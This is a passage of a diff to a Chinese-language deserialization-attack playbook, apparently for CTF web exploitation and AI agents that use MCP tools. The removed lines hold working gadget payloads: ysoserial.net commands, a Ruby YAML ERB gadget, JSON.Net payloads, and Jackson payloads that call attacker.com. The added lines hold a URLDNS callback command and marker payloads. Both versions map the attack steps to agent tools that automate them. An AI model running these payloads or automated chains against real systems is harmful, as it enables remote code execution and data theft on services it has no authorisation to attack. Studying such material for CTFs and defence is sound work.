+    ap.add_argument("blob")
+    args = ap.parse_args()
+    raw = args.blob.encode()
+    for layer, data in layers(raw):
+        hits = [fmt for magic, fmt in MAGIC if data.startswith(magic) or magic in data[:80]]
+        print(json.dumps({"layer": layer, "len": len(data), "hits": hits, "prefix_hex": data[:24].hex()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
----
+## 1. 路由矩阵
 
-## 5. .NET 反序列化 (ysoserial.net)
+| 格式 | 指纹 | 第一 oracle | 下一步 |
+|---|---|---|---|
+| PHP serialize | `O:<len>:"Class"` | 修改普通属性看输出 | 找 magic method 和类链 |
+| Python pickle | `\x80`, `GLOBAL`, `REDUCE` | marker print/error | opcode/白名单绕过 |
+| Java | `aced0005` / `rO0AB` | URLDNS callback | 依赖/gadget 指纹 |
+| Node serialize | `_$$ND_FUNC$$_` | IIFE marker | require/module 限制 |
+| .NET ViewState | `__VIEWSTATE` | MAC/错误文本 | validationKey/ViewStateUserKey |
+| YAML/Jackson/Hessian | type tag/class name | 类型实例化错误 | 多态 gadget/业务类 |
+
+## 2. Java URLDNS callback
 
 ```bash
-# 指纹: JSON/XML 序列化类型声明、BinaryFormatter magic bytes
-# ViewState 中的 __VIEWSTATE 参数
-
-# ysoserial.net
-ysoserial.exe -g ObjectDataProvider -c "cmd /c whoami" -f Json.Net
-ysoserial.exe -g WindowsIdentity -c "cmd /c whoami" -f SoapFormatter
-
-# TypeConfuseDelegate gadget (通用性最强)
-ysoserial.exe -g TypeConfuseDelegate -c "cmd" -f BinaryFormatter
+# 先用 DNS/HTTP callback 证明 readObject 触发，再换更高价值链
+java -jar ysoserial.jar URLDNS "http://case-id.listener.example" | base64 -w0
 ```
 
----
+Evidence：callback 域名、时间、来源 IP、目标参数、响应错误。没有 callback 时，不要直接升级 gadget，先确认编码层、签名、压缩和入口是否真的走反序列化。
 
-## 6. Ruby YAML 反序列化
-
-```yaml
-# Ruby 2.x/3.x YAML.load (不安全反序列化)
---- !ruby/object:Gem::Installer
-i: x
----
---- !ruby/object:ERB
-safe_level:
-src: |
-  <%= `id` %>
----
---- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
-? |
-  foo
-  (system('whoami'); @executed = true) unless @executed
-  __END__
-: !ruby/struct
-  defaults:
-    :format: json
-```
-
-```bash
-# 通用 Gadget: 利用 ERB 执行命令
-# 把上述 YAML 发送到接受 YAML 的 endpoint
-curl -X POST https://target.com/api/import -H "Content-Type: application/x-yaml" --data-binary @payload.yml
-```
-
----
-
-## 7. 反序列化识别速查
+## 3. PHP / Python / Node marker
 
 ```python
-# 自动识别序列化格式
-MAGIC = {
-    b"\xac\xed\x00\x05":      "Java serialized object",
-    b"rO0AB":                  "Java serialized (Base64)",
-    b"O:":                     "PHP serialized object",
-    b"a:":                     "PHP serialized array",
-    b"\x80\x02}":              "Python pickle proto 0",
-    b"\x80\x03}":              "Python pickle proto 2",
-    b"\x80\x04":               "Python pickle proto 4",
-    b"_$$ND_FUNC$$_":         "Node.js node-serialize",
-    b"AAEAAAD/////":          ".NET BinaryFormatter",
-    b"---\n":                  "YAML",
-    b"\x00\x01\x00\x00\x00":  ".NET ViewState",
-}
+#!/usr/bin/env python3
+import pickle
+import base64
 
-def detect_format(data: bytes) -> str:
-    for magic, fmt in MAGIC.items():
-        if data.startswith(magic):
-            return fmt
-    # 尝试 Base64 解码
-    import base64
-    try:
-        decoded = base64.b64decode(data)
-        for magic, fmt in MAGIC.items():
-            if decoded.startswith(magic):
-                return f"Base64({fmt})"
-    except: pass
-    return "unknown"
+class Marker:
+    def __reduce__(self):
+        return (print, ("PICKLE_MARKER",))
+
+print(base64.b64encode(pickle.dumps(Marker())).decode())
 ```
-
----
-
----
-
-## 8. 攻击链
-
-```
-PHP 反序列化 → GC bypass → __destruct → SoapClient SSRF → 内网 RCE
-PHP 反序列化 → SimpleXMLElement XXE → 文件读取 → config 泄露
-Python pickle → __reduce__ → os.system → RCE → flag
-Python pickle → Opcode 手写 → 绕过 find_class → import os → RCE
-Node.js node-serialize → IIFE → require('child_process') → RCE
-Java 反序列化 → CommonsCollections5 → Runtime.exec → RCE
-Java RMI → JRMPListener → 反弹连接 → RCE
-.NET ViewState → ysoserial.net → ObjectDataProvider → cmd 执行
-Ruby YAML → ERB gadget → `id` → RCE
-YAML 反序列化 → 文件读取 → .env → 数据库密码 → 数据泄露
-```
-
-## 9. Advanced Deserialization (2024-2025)
-
-### Jackson Polymorphic (Java)
 
 ```json
-// Jackson enableDefaultTyping() → 任意类实例化
-["com.zaxxer.hikari.HikariConfig", {"metricRegistry": "ldap://attacker.com/exp"}]
-["org.springframework.context.support.ClassPathXmlApplicationContext", ["http://attacker.com/beans.xml"]]
+{"marker":"_$$ND_FUNC$$_function(){return 'NODE_SERIALIZE_MARKER'}()"}
 ```
 
-### Hessian Dubbo Gadget
-
-```java
-// Hessian 不走 readObject() → 绕过 Java deserialization filter
-// 利用: SpringPartiallyComparableAdvisorHolder → JNDI
-// 或: SwingLazyValue → Runtime.exec
-Map map = new HashMap();
-map.put("lazyValue", new UIDefaults.ProxyLazyValue("javax.script.ScriptEngineManager"));
-// Hessian 反序列化 → createValue() → ScriptEngineManager
+```text
+O:8:"stdClass":1:{s:6:"marker";s:10:"PHP_MARKER";}
 ```
 
-### JSON.Net TypeNameHandling
+这些 marker 用来判断“是否执行/还原/进入错误分支”，不是最终链。成功样本是 marker 回显、错误栈变化、callback 到达或业务状态变化。
 
-```json
-// TypeNameHandling.None 以外的所有模式都危险
-{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
- "MethodName": "Start", "MethodParameters": {"$type": "...", "values": ["cmd", "/c whoami"]}}
+## 4. Gadget 选择矩阵
+
+| 语言 | 证据 | 常见路线 |
+|---|---|---|
+| PHP | class name、Composer lock、magic method | `__destruct`, `__toString`, Phar metadata, SoapClient SSRF |
+| Java | classpath、依赖版本、JDK | URLDNS, CommonsCollections, Spring, Groovy, Hessian/Dubbo |
+| Python | pickle opcode、find_class 限制 | `__reduce__`, opcode 手写, 已加载模块 |
+| Node | node-serialize/serialize-javascript | IIFE, prototype pollution 串联 |
+| .NET | formatter、ViewState、MAC | ysoserial.net format/gadget 匹配 |
+| Ruby/YAML | type tag、Rails/Gem 版本 | YAML object graph, ERB/Gem gadgets |
+
+## 5. 入口变体
+
+| 包裹方式 | 操作 |
+|---|---|
+| Cookie | URL/base64 双层编码，注意 `;` 截断 |
+| JSON field | payload 字符串转义，Content-Type 固定 |
+| multipart upload | filename/content metadata |
+| session store | 修改 session cookie 或服务端 session 文件 |
+| message queue | body + headers 同时带类型 |
+| cache/job import | 上传配置文件后触发 worker |
+
+## 攻击链
+
+```text
+blob 识别
+  → marker oracle
+  → 依赖/类路径指纹
+  → gadget/业务类链
+  → callback、回显、文件、SSRF、flag 差异
 ```
-
-### JDK 17/21 Internal Gadgets
-
-```python
-# JDK 8 的经典 gadget 被移除后，攻击者转向 JDK 内部类:
-# - java.util.PriorityQueue + Proxy (still works)
-# - javax.management.BadAttributeValueExpException
-# - sun.print.UnixPrintServiceLookup (file read via SSRF-like)
-# - java.nio.file (Path objects deserialization)
-```
-
-记录: 原始序列化 hex/base64、识别出的格式、使用的 gadget 链、DNS callback 验证、最终命令执行结果
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 反序列化端点探测 | `http_probe` | HTTP GET 探测反序列化入口点 |
-| 知识检索 | `kb_router` | 按反序列化攻击信号搜索知识库 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| blob | 原始值、编码层、magic bytes、参数位置 |
+| 格式 | 语言/库/formatter、错误文本、依赖证据 |
+| marker | marker payload、回显/callback/状态差异 |
+| gadget | 链名、前置依赖、触发方法、输入输出 |
+| 成功样本 | callback、命令输出、文件读取、SSRF、flag 或业务状态变化 |
+| 失败样本 | magic 不匹配、签名/MAC 拒绝、类不存在、filter 拒绝、无触发点 |
+| 下一跳 | Soap/SSRF 转 04-ssrf；PP 串联转 prototype-pollution；凭据转 database/payment |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 入口探测 | `http_probe` | 固定 blob 参数、编码层和响应 oracle |
+| 知识路由 | `kb_router` | 按 deserialization、pickle、ysoserial、ViewState、Hessian 搜索 |
 
 
 ---
